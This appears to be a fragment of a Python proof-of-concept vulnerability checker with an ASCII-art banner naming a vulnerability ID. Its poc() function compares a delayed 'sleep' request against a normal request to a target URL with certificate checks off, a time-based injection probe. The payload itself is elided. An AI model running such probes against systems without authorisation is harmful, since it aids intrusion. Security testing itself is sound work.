...
def banner():
    test = """
    ___     __         ___     ____   ___ ____  ____        ___   __  ____ __________ 
  / __\ /\ \ \/\   /\/   \   |___ \ / _ \___ \|___ \      ( _ ) / /_| ___|___ /___  |
 / /   /  \/ /\ \ / / /\ /____ __) | | | |__) | __) |____ / _ \| '_ \___ \ |_ \  / / 
/ /___/ /\  /  \ V / /_//_____/ __/| |_| / __/ / __/_____| (_) | (_) |__) |__) |/ /  
\____/\_\ \/    \_/___,'     |_____|\___/_____|_____|     \___/ \___/____/____//_/   
                                                                                     """
    print(test)
...
def poc(target, output_file):
    ...
    try:
        ...
        res_sleep = requests.post(
            url=target + payload, headers=headers, data=data_sleep, verify=False
        )
        res_normal = requests.get(
            url=target + payload, headers=headers, data=data_normal, verify=False
        )
